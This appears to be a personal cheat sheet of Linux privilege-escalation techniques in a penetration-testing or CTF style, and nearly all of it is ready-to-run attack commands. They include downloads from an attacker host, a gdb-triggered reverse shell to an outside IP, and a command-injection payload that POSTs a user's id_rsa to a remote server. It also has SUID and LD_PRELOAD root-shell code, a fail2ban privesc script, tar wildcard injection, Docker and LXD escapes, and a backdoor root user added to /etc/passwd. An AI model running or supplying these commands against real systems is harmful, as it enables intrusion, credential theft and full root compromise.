---
description: Bunch of things I tend to forget.
---

# Linux PE Methodology

## Automatic

Generally, I like to run LinPeas.sh as a start to enumeration, because it does a lot of checks for you sometimes.

```bash
wget <attacker_IP>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

There are manual ways to enumerate, however.

## Manual

#### Check hostname:

```bash
uname -a
```

#### Check for KE:

```bash
lscpu
cat /proc/version
cat /etc/issue
searchsploit Linux Kernel <version>
```

#### Check for networking details:

```bash
arp -a 
ifconfig
ip addr
```

#### Checking network routes:

```bash
route -a 
```

### Looting

#### Check files that may contain passwords:

```bash
grep --color=auto -rnw '/' -ie "password" --colour=always 2> /dev/null
find . -type f -exec grep -i -I "Password" {} /dev/null \;
cat /etc/security/opasswd
```

#### Check last edited files:

```bash
find ./ -mmin -20 2>/dev/null | grep -Ev "^/proc"
```

#### Check passwords in memory:

```bash
strings /dev/mem -n10 | grep -i PASS
```

#### Check for any SSH Keys:

```bash
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```

If there are authorized keys found, check if it's a SSH-DSS string, because they may be weak and have repositories regarding them.

```bash
git clone https://github.com/g0tmi1k/debian-ssh
cd debian-ssh
tar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2
grep -lr 'AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf'
dsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub
```

#### Check if we have access to any of these files:

```
/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/anacrontab
/var/spool/cron
/var/spool/cron/crontabs/root

crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*
```

Use pspy64/pspy32 to check on processes that are being run if we do not have access:

```bash
wget <attacker_ip>/pspy
chmod +x pspy
./pspy
```

### SUID Binaries

#### Check which binaries have SUID binary set:

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

Then head to GTFOBins that would do it for us.

#### Creating SUID binaries:

```bash
print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
gcc -o /tmp/suid /tmp/suid.c  
sudo chmod +x /tmp/suid 
sudo chmod +s /tmp/suid 
```

#### Check which binaries have cool capabilities:

```bash
/usr/bin/getcap -r /usr/bin
```

#### Edit capabilities if needed:

```bash
/usr/bin/setcap -r /bin/ping            # remove
/usr/bin/setcap cap_net_raw+p /bin/ping # add
```

#### Sudo:

```bash
sudo -l
```

#### LD\_PRELOAD and NOPASSWD:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

Take note that for freeBSD, the sudo command is known as doas.

#### Doas:

```bash
cat /etc/doas.conf
```

#### Wildcards:&#x20;

Generally, wildcards are vulnerable. We can trick root by doing some unique commands:

```bash
# create file for exploitation
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
echo "#\!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag" > shell.sh

# vulnerable script
tar cf archive.tar *
```

#### Writable files:

```bash
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
find / -perm -2 -type f 2>/dev/null
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```

#### NFS Root Squashing:

```bash
cat /etc/exports
```

if no\_root\_squash appears, we can do this:

```bash
# remote check the name of the folder
showmount -e 10.10.10.10

# create dir
mkdir /tmp/nfsdir  

# mount directory 
mount -t nfs 10.10.10.10:/shared /tmp/nfsdir    
cd /tmp/nfsdir

# copy wanted shell 
cp /bin/bash . 	

# set suid permission
chmod +s bash 	
```

#### Docker:

```bash
docker run -it --rm -v $PWD:/mnt bash
 echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
```

This would create a user called 'toor' with a password of 'password'.

```bash
docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash
```

We can also docker this to spawn a root image depending on the type of image that is present on the machine.

#### LXD:

```bash

# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
./build-alpine -a i686

# import the image
lxc image import ./alpine.tar.gz --alias myimage

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

Check all the possible config.php files or something as well! We may find some password re-use or SQL passwords that can be abused.

For Linux, PE Vectors are easier to identify.

Including the above, we should be able to find every single vulnerability that exists on a Linux machine.

#### Fail2Ban PE:

```bash
#!/usr/bin/bash

# title : fail2ban-privesc
# author : Ravindu Wickramasinghe (@rvizx9)


echo '
+==============================+
|  fail2ban-privesc | @rvizx9  |
+==============================+

'

conf="
[INCLUDES]
before = iptables-common.conf
[Definition]

actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'
actionban = chmod 4755 /bin/bash
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>
[Init]
"

rm -rf /etc/fail2ban/action.d/iptables-multiport.conf
echo "$conf" > iptables-multiport.conf
mv iptables-multiport.conf /etc/fail2ban/action.d/
sudo /etc/init.d/fail2ban restart
ip -br -c a

echo "[!] start to bruteforce ssh login."
echo "[run] @attacker : hydra <ip-addr> -l root -P /usr/share/wordlists/rockyou.txt ssh"
echo "[!] bash -p will be executed in 100s"
sleep 100
bash -p
```

#### wfuzz SubDomain:

```bash
wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host: preprod-FUZZ.trick.htb" --hw 475 -t 100 10.129.86.46
```

#### Find directories that can do not have `nosuid` option:

```bash
find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \; 2>/dev/null
```

#### Allowed to Debug processes:

```bash
#Find a process running as root

gdb -p <PID>

call (void)system("bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'")

#This would require us to be a part of the debug group or be able to use GDB in it's full capacity.
```

#### Linux LFI through Curl:

```bash
127.0.0.1;curl${IFS}-X${IFS}POST${IFS}-F${IFS}"file=@/home/franz/.ssh/id_rsa"${IFS}http://192.168.49.123/test

nc -lvnp 80 #on listener port, we would receive file
```

#### Check for GPG keys and private stuff:

```bash
gpg2john encrypted_key > key_hash #if needed
gpg --import encrypted_key #with passcode
gpg --decrypt encoded_text --output decoded_text
```

#### Check for sockets that are run as root:

```bash
nc -U /tmp/socket.c
cp /bin/bash /tmp/bash && chmod u=s bash
```

#### OpenSSL to host server to read files:

```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes #inside /tmp

/opt/cert/openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 1337 -HTTP

curl https://localhost:1337/etc/shadow
curl https://localhost:1337/root/.ssh/id_rsa
```

#### Create SSH key for a user:

```bash
mkdir .ssh && cd .ssh
echo '<public key>' > authorized_keys

#On attacker machine
ssh -o StrictHostKeyChecking=no user@victim.host
```

#### Checking for library without debuggin:

```bash
ltrace <absolute path to file>
#Check for unquoted service paths and PATH hijacking vulnerabilities. 

#If there is OS command Injection or forms of BOF, please debug accordingly.
```

#### SNMP Execute shell:

```bash
echo '#!/bin/bash\n echo thisisRCE' > /tmp/shtest
chmod 777 shtest

#on attaker machine
snmpbulkwalk -c <string> -v2c 192.168.123.113 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

#### SVN Enumeration:

```bash
svn log --username admin --password admin http://<IP>/path/to/svn
```
